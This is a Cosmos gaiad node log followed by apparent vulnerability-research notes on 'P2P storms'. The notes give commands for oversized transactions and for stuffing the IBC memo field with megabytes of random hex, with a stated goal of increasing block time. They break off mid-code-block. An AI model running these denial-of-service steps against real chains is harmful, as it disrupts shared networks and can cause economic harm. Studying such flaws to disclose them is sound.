12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF Inbound Peer rejected err="auth failure: handshake failed: EOF" module=p2p numPeers=38
12:24PM INF Timed out dur=4748.196678 height=3401483 module=consensus round=0 step=1
12:24PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"C9AC72AD71D3A685A503E349F3204A7CB98AC160C0083B91EF67701FA8D84C62","parts":{"hash":"E990F1B5FE71EB5ED7A0D9A2CB769D41CBC72ACEC2E7965AFD334B013475E504","total":1}},"height":3401483,"pol_round":-1,"round":0,"signature":"VF0/9ZWPHionsfQi9N2UkvN4jp6OJ54+hlFR6WV7F0Mv1QclBugv3XQrxw6ae97rNI+rORn4bmaKNGrNPJEZDA==","timestamp":"2023-09-27T10:24:41.149189059Z"}
12:24PM INF received complete proposal block hash=C9AC72AD71D3A685A503E349F3204A7CB98AC160C0083B91EF67701FA8D84C62 height=3401483 module=consensus
12:24PM INF finalizing commit of block hash={} height=3401483 module=consensus num_txs=0 root=01B2BB7C91A6E4EF09CE5688CA3AE8A9800E7485D0BAB486563785345A8040CE
12:24PM INF minted coins from module account amount=23279415uatom from=mint module=x/bank
12:24PM INF executed block height=3401483 module=state num_invalid_txs=0 num_valid_txs=0
12:24PM INF commit synced commit=436F6D6D697449447B5B3833203139332031342032332032362031333820352035332032333320313036203131382033302031303820333120313338203120323038203134312032342031343820323531203230362038362032313120313720323135203233342031373620353320323335203733203130315D3A3333453730427D
12:24PM INF committed state app_hash=53C10E171A8A0535E96A761E6C1F8A01D08D1894FBCE56D311D7EAB035EB4965 height=3401483 module=state num_txs=0
12:24PM INF indexed block exents height=3401483 module=txindex
12:24PM INF Saving AddrBook to file book=/root/.gaia-rs/config/addrbook.json module=p2p size=1471
12:24PM INF Ensure peers module=pex numDialing=0 numInPeers=8 numOutPeers=30 numToDial=970
12:24PM INF service start impl="Peer{MConn{23.109.158.180:26656} 5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a out}" module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:24PM INF service start impl=MConn{23.109.158.180:26656} module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:24PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:24PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:24PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:24PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:24PM INF service start impl="Peer{MConn{[2604:a880:cad:d0::8:f001]:25001} b7d0bd260fca7a5a19c7631b15f6068891faa60e out}" module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:24PM INF service start impl=MConn{[2604:a880:cad:d0::8:f001]:25001} module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:24PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:24PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:24PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:24PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:24PM INF service start impl="Peer{MConn{[2604:a880:4:1d0::4e9:1000]:25003} f2520026fb9086f1b2f09e132d209cbe88064ec1 out}" module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:24PM INF service start impl=MConn{[2604:a880:4:1d0::4e9:1000]:25003} module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:24PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:24PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:24PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:24PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:24PM INF Timed out dur=4869.057077 height=3401484 module=consensus round=0 step=1
12:24PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"D1F5738518CD45FE5DDF0C1833619BFD3B662BC4EE00E2394E61599B29DB537C","parts":{"hash":"EA39533EB33DA7325B093C95FEC3F08196034EE3690FB123ED2651EE2CC02FC8","total":1}},"height":3401484,"pol_round":-1,"round":0,"signature":"uCHT7ZwK3fjLhj2h5aVYvGPh16heG4SEeIS4hhrdC9u6LxLHEWKARs+W51DmLFkhNQaA2cHSE2A7ykYor8nhAA==","timestamp":"2023-09-27T10:24:46.887630474Z"}
12:24PM INF received complete proposal block hash=D1F5738518CD45FE5DDF0C1833619BFD3B662BC4EE00E2394E61599B29DB537C height=3401484 module=consensus
12:24PM INF finalizing commit of block hash={} height=3401484 module=consensus num_txs=0 root=53C10E171A8A0535E96A761E6C1F8A01D08D1894FBCE56D311D7EAB035EB4965
12:24PM INF minted coins from module account amount=23279415uatom from=mint module=x/bank
12:24PM INF executed block height=3401484 module=state num_invalid_txs=0 num_valid_txs=0
12:24PM INF commit synced commit=436F6D6D697449447B5B3231332032343420313034203337203433203539203138382031342031363820323232203832203535203132203131372031353920313020313631203135302031363320343620323133203938203132312035362032303320373520313738203232312034352032303620323332203138395D3A3333453730437D
12:24PM INF committed state app_hash=D5F468252B3BBC0EA8DE52370C759F0AA196A32ED5627938CB4BB2DD2DCEE8BD height=3401484 module=state num_txs=0
12:24PM INF indexed block exents height=3401484 module=txindex
12:24PM INF service start impl="Peer{MConn{176.9.82.221:44262} ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0 in}" module=p2p msg={} peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":44262}
12:24PM INF service start impl=MConn{176.9.82.221:44262} module=p2p msg={} peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":44262}
12:24PM INF Inbound Peer rejected err="auth failure: handshake failed: EOF" module=p2p numPeers=39
12:24PM INF Timed out dur=4849.49363 height=3401485 module=consensus round=0 step=1
12:24PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"A0B04981009EA454D92DDCD363892CE0EC9D73FAB250C2CBA164477AD8FA6754","parts":{"hash":"8D29D75497FA516BFF5B3B7061CC7F412635294FD3C4EB5DAB3A7B6B7676BCD9","total":1}},"height":3401485,"pol_round":-1,"round":0,"signature":"93Q7PKNOknlj3kPisYxFpT4PWbd2F7JF4tZQ/NDUwFo272YQyJqfBpe30wqawyLrPkiT+Wi4hRRzjbThRgDFDA==","timestamp":"2023-09-27T10:24:52.577458361Z"}
12:24PM INF received complete proposal block hash=A0B04981009EA454D92DDCD363892CE0EC9D73FAB250C2CBA164477AD8FA6754 height=3401485 module=consensus
12:24PM INF finalizing commit of block hash={} height=3401485 module=consensus num_txs=0 root=D5F468252B3BBC0EA8DE52370C759F0AA196A32ED5627938CB4BB2DD2DCEE8BD
12:24PM INF minted coins from module account amount=23279416uatom from=mint module=x/bank
12:24PM INF executed block height=3401485 module=state num_invalid_txs=0 num_valid_txs=0
12:24PM INF commit synced commit=436F6D6D697449447B5B3233322032313820323238203135352033302037312031343620313238203135382037352031363920353720313437203533203235322032203737203132372031303420313432203136372031303920313830203139342031303120382031343920362031343920313236203230203232385D3A3333453730447D
12:24PM INF committed state app_hash=E8DAE49B1E4792809E4BA9399335FC024D7F688EA76DB4C265089506957E14E4 height=3401485 module=state num_txs=0
12:24PM INF indexed block exents height=3401485 module=txindex
12:24PM INF Timed out dur=4739.268121 height=3401486 module=consensus round=0 step=1
12:24PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"34723C7BF0364B43FDE6604A17A84EFBF43DFB4484A73FA05D05EB159458EA0D","parts":{"hash":"0F26AE73965891F10260B51CFDCC2F1C3758710961087A82C86889D3D2D31547","total":1}},"height":3401486,"pol_round":-1,"round":0,"signature":"MKNQ+8eRDj0hThnDqUdyhbeXdU87I01ezsLC+ZvY7IvXNMr5BMUZWrnn1vag2WSfkwtnjTJhppTSZk1eqMsNCg==","timestamp":"2023-09-27T10:24:58.544167732Z"}
12:24PM INF received complete proposal block hash=34723C7BF0364B43FDE6604A17A84EFBF43DFB4484A73FA05D05EB159458EA0D height=3401486 module=consensus
12:24PM INF finalizing commit of block hash={} height=3401486 module=consensus num_txs=0 root=E8DAE49B1E4792809E4BA9399335FC024D7F688EA76DB4C265089506957E14E4
12:24PM INF minted coins from module account amount=23279417uatom from=mint module=x/bank
12:24PM INF executed block height=3401486 module=state num_invalid_txs=0 num_valid_txs=0
12:24PM INF commit synced commit=436F6D6D697449447B5B3634203136322032353420313735203235312031353620323532203130352031333920373820323233203433203134382031303620313837203436203137392033392031383520313939203233352031343720323439203233372032392037382034203631203920363020313937203131305D3A3333453730457D
12:24PM INF committed state app_hash=40A2FEAFFB9CFC698B4EDF2B946ABB2EB327B9C7EB93F9ED1D4E043D093CC56E height=3401486 module=state num_txs=0
12:24PM INF indexed block exents height=3401486 module=txindex
12:25PM INF Inbound Peer rejected err="auth failure: handshake failed: EOF" module=p2p numPeers=39
12:25PM INF Timed out dur=4875.771402 height=3401487 module=consensus round=0 step=1
12:25PM INF Timed out dur=3000 height=3401487 module=consensus round=0 step=3
12:25PM INF Timed out dur=1000 height=3401487 module=consensus round=0 step=7
12:25PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"5B6A9C21AA27DA5D6A404755E512C3ED7C946DE3F351C236253A780741BDB642","parts":{"hash":"8F356907C3D4166D202422CF159D78D216BE25A9F2B13D8BC3014413C61C9381","total":1}},"height":3401487,"pol_round":-1,"round":1,"signature":"wY31Lm7da+Srmikjvzc0FVgYG4m0k+Ould27f8QP4x9AGCrnKDcdQHrgqHJyxeiXS+i9ez3p5ngRzhwgoNTnDQ==","timestamp":"2023-09-27T10:25:08.881723083Z"}
12:25PM INF received complete proposal block hash=5B6A9C21AA27DA5D6A404755E512C3ED7C946DE3F351C236253A780741BDB642 height=3401487 module=consensus
12:25PM INF Inbound Peer rejected err="auth failure: handshake failed: EOF" module=p2p numPeers=39
12:25PM INF finalizing commit of block hash={} height=3401487 module=consensus num_txs=0 root=40A2FEAFFB9CFC698B4EDF2B946ABB2EB327B9C7EB93F9ED1D4E043D093CC56E
12:25PM INF minted coins from module account amount=23279418uatom from=mint module=x/bank
12:25PM INF executed block height=3401487 module=state num_invalid_txs=0 num_valid_txs=0
12:25PM INF commit synced commit=436F6D6D697449447B5B373420323533203230342031333920313937203235312032313320353420323433203233362032333620323030203835203138203831203139392032313720313539203231342032343820323430203232312031342032382032343020313136203331203235342032313820373120313031203136385D3A3333453730467D
12:25PM INF committed state app_hash=4AFDCC8BC5FBD536F3ECECC8551251C7D99FD6F8F0DD0E1CF0741FFEDA4765A8 height=3401487 module=state num_txs=0
12:25PM INF indexed block exents height=3401487 module=txindex
12:25PM INF Timed out dur=4872.365025 height=3401488 module=consensus round=0 step=1
12:25PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":44262}
12:25PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":44262}
12:25PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:25PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":44262}
12:25PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"8BAF0CAE271363CB93A274587B257D2301C42B46768912844D3158801915D76A","parts":{"hash":"FADB0B6F797B38BE36637D9F39CC49260C8BFC07B59F752AD3A6F278BF29AC18","total":1}},"height":3401488,"pol_round":-1,"round":0,"signature":"vqpj1r1pLSzOJqgYtnAtIcYiuSwg5FKJx2hQGJqfFiHHxgNolmix3zSKa3d80/bRTUnyyHIEi/PKLDN8xw0DDA==","timestamp":"2023-09-27T10:25:14.684930075Z"}
12:25PM INF received complete proposal block hash=8BAF0CAE271363CB93A274587B257D2301C42B46768912844D3158801915D76A height=3401488 module=consensus
12:25PM INF Ensure peers module=pex numDialing=0 numInPeers=8 numOutPeers=30 numToDial=970
12:25PM INF service start impl="Peer{MConn{176.9.82.221:14956} ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0 out}" module=p2p msg={} peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":14956}
12:25PM INF service start impl=MConn{176.9.82.221:14956} module=p2p msg={} peer={"id":"ade4d8bc8cbe014af6ebdf3cb7b1e9ad36f412c0","ip":"176.9.82.221","port":14956}
12:25PM INF service start impl="Peer{MConn{23.109.158.180:26656} 5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a out}" module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:25PM INF service start impl=MConn{23.109.158.180:26656} module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:25PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:25PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:25PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:25PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"5f076d69ba0ee4a68cb97e6221063f0f0a6ed81a","ip":"23.109.158.180","port":26656}
12:25PM INF service start impl="Peer{MConn{[2604:a880:cad:d0::8:f001]:25001} b7d0bd260fca7a5a19c7631b15f6068891faa60e out}" module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:25PM INF service start impl=MConn{[2604:a880:cad:d0::8:f001]:25001} module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:25PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:25PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:25PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:25PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"b7d0bd260fca7a5a19c7631b15f6068891faa60e","ip":"2604:a880:cad:d0::8:f001","port":25001}
12:25PM INF finalizing commit of block hash={} height=3401488 module=consensus num_txs=0 root=4AFDCC8BC5FBD536F3ECECC8551251C7D99FD6F8F0DD0E1CF0741FFEDA4765A8
12:25PM INF minted coins from module account amount=23279419uatom from=mint module=x/bank
12:25PM INF executed block height=3401488 module=state num_invalid_txs=0 num_valid_txs=0
12:25PM INF commit synced commit=436F6D6D697449447B5B3731203831203138203233342035342038362031343620313430203137352033332031323020313220313434203230392031373820323420333620313637203434203631203234362036302037392031313520323432203732203131312031362031322031303820313431203233335D3A3333453731307D
12:25PM INF committed state app_hash=475112EA3656928CAF21780C90D1B21824A72C3DF63C4F73F2486F100C6C8DE9 height=3401488 module=state num_txs=0
12:25PM INF service start impl="Peer{MConn{[2604:a880:4:1d0::4e9:1000]:25003} f2520026fb9086f1b2f09e132d209cbe88064ec1 out}" module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:25PM INF service start impl=MConn{[2604:a880:4:1d0::4e9:1000]:25003} module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:25PM INF Connection is closed @ recvRoutine (likely by the other side) conn={"Logger":{}} module=p2p peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:25PM INF service stop impl={"Logger":{}} module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:25PM ERR Stopping peer for error err=EOF module=p2p peer={"Data":{},"Logger":{}}
12:25PM INF service stop impl={"Data":{},"Logger":{}} module=p2p msg={} peer={"id":"f2520026fb9086f1b2f09e132d209cbe88064ec1","ip":"2604:a880:4:1d0::4e9:1000","port":25003}
12:25PM INF indexed block exents height=3401488 module=txindex
12:25PM INF Timed out dur=4749.269735 height=3401489 module=consensus round=0 step=1
12:25PM INF received proposal module=consensus proposal={"Type":32,"block_id":{"hash":"E4CCC9C62E55C586DB50217CC192BAB3A7CBB7B0732933C9F4EE810C74FDFC5B","parts":{"hash":"6B085F714C7013B50AD18D798A581DA0CC01D8E1B97C23D9EB97665C0942546A","total":1}},"height":3401489,"pol_round":-1,"round":0,"signature":"a3h0kwtVe0DuDuE/Rp5o3P7+nESPELpcZpxi9G18Kktlw+oLH3DpOYI0kPZG5Vj46otJ94iiU1aF2/ySP/n8CQ==","timestamp":"2023-09-27T10:25:20.522185308Z"}
12:25PM INF received complete proposal block hash=E4CCC9C62E55C586DB50217CC192BAB3A7CBB7B0732933C9F4EE810C74FDFC5B height=3401489 module=consensus
12:25PM INF Inbound Peer rejected err="auth failure: handshake failed: EOF" module=p2p numPeers=39
12:25PM INF finalizing commit of block hash={} height=3401489 module=consensus num_txs=0 root=475112EA3656928CAF21780C90D1B21824A72C3DF63C4F73F2486F100C6C8DE9
12:25PM INF minted coins from module account amount=23279419uatom from=mint module=x/bank
12:25PM INF executed block height=3401489 module=state num_invalid_txs=0 num_valid_txs=0
12:25PM INF commit synced commit=436F6D6D697449447B5B31363020333020313620313830203133392038203932203132382031353120323433203138312031373420333020323436203132312032323820393720372035342031363120373220313138203233302031312035352032303420323435203131362031383020383120313739203139305D3A3333453731317D
12:25PM INF committed state app_hash=A01E10B48B
```





## Links to explorer

* **client updates**
 * https://ping.pub/cosmos/tx/2BA652123FFD549CCFA672BDD596801DABAD680029EA817369814DE5750DB4AB

* **testing wallet - mainnet**
  * https://www.mintscan.io/cosmos/address/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq
  * txns were made so that they fail intentionally.

* **testing wallet - testnet**
  * will vary between failed transactions and successes
  * goal is to increase block time on the testnet
  * https://explorer.rs-testnet.polypore.xyz/ 
  


## Target

We're looking to transmit a "banana client".  This transaction will 


## P2P storms have occured on the following networks:

* Sentinel
* Luna Classic
  * Led to economic harm 
* Stride


## Notes

Change the maximum request body size in config.toml

```toml
# Maximum size of request body, in bytes
max_body_bytes = 100000000
```

Generate a random string (hex output)

```bash
openssl rand -hex 10000000
```

Sign a transcation


Broadcast a transaction (oddly cli won't broadcast, we'll need to chain it)
```bash
gaiad tx broadcast bananasigned1.json --home ~/.gaia-rs
```

Abuse the ibc memo field
```bash
gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 10000) --chain-id provider --gas auto --yes
 ```

 Abuse the ibc memo field fast
 ```bash
